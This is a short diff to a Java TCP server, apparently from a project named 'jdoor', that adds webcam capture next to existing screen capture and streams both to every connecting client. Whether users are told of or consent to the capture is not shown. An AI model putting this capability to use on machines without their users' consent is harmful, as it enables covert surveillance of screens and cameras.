@@ -1,6 +1,7 @@
 package com.jdoor.server;
 
 import com.jdoor.server.screen.ScreenCaptureThread;
+import com.jdoor.server.webcam.WebcamCaptureThread;
 
 import java.awt.*;
 import java.io.IOException;
@@ -14,10 +15,14 @@ public class Server {
     public static void main(String[] args) throws IOException {
         ServerSocket ss = new ServerSocket(TCP_PORT);
         ScreenCaptureThread screenCaptureThread = null;
+        WebcamCaptureThread webcamCaptureThread = null;
         // Ottenere thread che manda le schermate.
         try {
             screenCaptureThread = ScreenCaptureThread.getScreenCaptureThread();
             screenCaptureThread.start();
+
+            webcamCaptureThread = WebcamCaptureThread.getWebcamCaptureThread();
+            webcamCaptureThread.start();
         } catch (AWTException awte) {
             awte.printStackTrace();
             return;
@@ -31,8 +36,10 @@ public class Server {
             st.start();
             // Aggiungere classe.
             screenCaptureThread.addClient(st);
+            webcamCaptureThread.addClient(st);
         }
         screenCaptureThread.stopRunning();
+        webcamCaptureThread.stopRunning();
 
         ss.close();
     }
